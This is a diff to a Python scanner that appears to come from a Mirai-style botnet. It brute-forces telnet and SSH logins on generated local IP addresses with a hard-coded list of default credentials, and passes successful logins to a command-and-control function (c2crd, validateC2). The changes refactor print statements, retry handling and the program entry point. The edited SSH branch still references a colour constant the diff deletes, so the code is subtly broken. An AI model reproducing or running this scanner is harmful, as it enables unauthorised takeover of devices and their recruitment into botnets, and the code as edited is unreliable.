@@ -10,12 +10,8 @@ from threading import Thread
 import paramiko
 from colorama import init, Fore
 
-init()
 
-GREEN = Fore.GREEN
-RED = Fore.RED
-RESET = Fore.RESET
-BLUE = Fore.BLUE
+
 MAlist = [('admin', 'password'),
           ('root', 'vizxv'),
           ('root', 'admin'),
@@ -91,7 +87,7 @@ def get_credentials(pindex):
     global MAlist
     user = MAlist[pindex][0]
     password = MAlist[pindex][1]
-    print("[Scanner] Trying %s:%s" % (user, password))
+    print(f"[Scanner] Trying {user}:{password}")
     pindex += 1
     return user, password
 
@@ -119,7 +115,7 @@ def c2crd(usr, psw, ip, port):
 '''  Scan and brute telnet ( 23 & 2323 )'''
 def bruteport(ip, port):    #try 23 & 2323
 
-    print("[Scanner] Attempting to brute found IP %s" % ip)
+    print(f"[Scanner] Attempting to brute found IP {ip}" )
     response = ""
     tn = None
     need_user = False
@@ -131,18 +127,18 @@ def bruteport(ip, port):    #try 23 & 2323
             if not tn:
                 asked_password_in_cnx = False
                 tn = telnetlib.Telnet(ip, port)
-                print("[Scanner] Connection established to found ip %s" % ip) # can connect this ip and port
+                print(f"[Scanner] Connection established to found ip {ip}" ) # can connect this ip and port
             while True:
-                response = tn.read_until(b":", 1)  # Wait until you can see: Appears to indicate that you can try to log in
+                response = tn.read_until(b":", 1)                           # Wait until you can see: Appears to indicate that you can try to log in
                 # print("Response: " + str(response))
                 if "Login:" in str(response) or "Username:" in str(response):  # if login or username exist in response
                     print("[Scanner] Received username prompt")
-                    need_user = True                     # If retrying to log in requires entering an account  then set True
-                    asked_password_in_cnx = False        # Did you ask for a password ?
-                    user, password = get_credentials(pindex)  # generate pair of account and password
-                    tn.write((user + "\n").encode('ascii'))   # send username to login account 
+                    need_user = True                                        # If retrying to log in requires entering an account  then set True
+                    asked_password_in_cnx = False                           # Did you ask for a password ?
+                    user, password = get_credentials(pindex)                # generate pair of account and password
+                    tn.write((user + "\n").encode('ascii'))                 # send username to login account 
                 elif "Password:" in str(response) or "password" in str(response):    
-                    if asked_password_in_cnx and need_user:   # if ask password before and need account then close connect 
+                    if asked_password_in_cnx and need_user:                 # if ask password before and need account then close connect 
                         tn.close()
                         break
                     asked_password_in_cnx = True
@@ -158,10 +154,8 @@ def bruteport(ip, port):    #try 23 & 2323
                     print("[Scanner] Brutefoce succeeded %s " % ip + ' : '.join((user, password)))
                     c2crd(user, password, ip, port)
                     pindex = 0
-                    break
+                    return 
                 pindex += 1
-            if ">" in str(response) or "$" in str(response) or "#" in str(response) or "%" in str(response):
-                break
         except EOFError as e:
             tn = None
             need_user = False
@@ -196,33 +190,32 @@ def is_ssh_open(ip):
     # add to know hosts
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     pindex = 0
+    retry_two_times=False
     while True:
         username, password = get_credentials(pindex)
         pindex += 1
         try:
-            client.connect(hostname=ip, username=username,
-                           password=password, timeout=3)
+            client.connect(hostname=ip, username=username, password=password, timeout=3)
         except socket.timeout:
-            # this is when host is unreachable
-            print(f"{RED}[!] Host: {ip} is unreachable, timed out.{RESET}")
-            return False
+            print(f"[Scanner] Host: {ip} is unreachable, timed out.")
+            return 
         except paramiko.AuthenticationException:
-            print(f"[!] Invalid credentials for {username}:{password}")
+            print(f"[Scanner] Invalid credentials for {username}:{password}")
             return False
         except paramiko.SSHException:
-            print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
-            # sleep for a minute
+            print(f"[Scanner] Quota exceeded, retrying with delay...")
             time.sleep(60)
+            if retry_two_times:
+                return
+            retry_two_times=True
             return is_ssh_open(ip)
         else:
-            # connection was established successfully
-            print(
-                f"{GREEN}[+] Found combo:\n\tHOSTNAME: {ip}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
+            print(f"[Scanner] Found combo:\n\tHOSTNAME: {ip}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
             return True
 
 
 def generate_IP(index):
-    return "192.168."+str(index)+".167"
+    return f"192.168.1.{index}"
 
 
 def getOS():
@@ -262,12 +255,16 @@ def Scanner(choose):
                 print("[Scanner] Error: " + str(e))
                 break
     else:
+        print("Try to scan Telnet ---------------")
+        is_telent_open("192.168.1.167")
+        print("Try to scan Telnet ---------------")
         is_ssh_open("192.168.1.167")
 
 
-print("[Scanner] Scanner process started ..")
-validateC2()
+
 if __name__ == '__main__':
+    print("[Scanner] Scanner process started ..")
+    validateC2()
     Scanner()
 
 
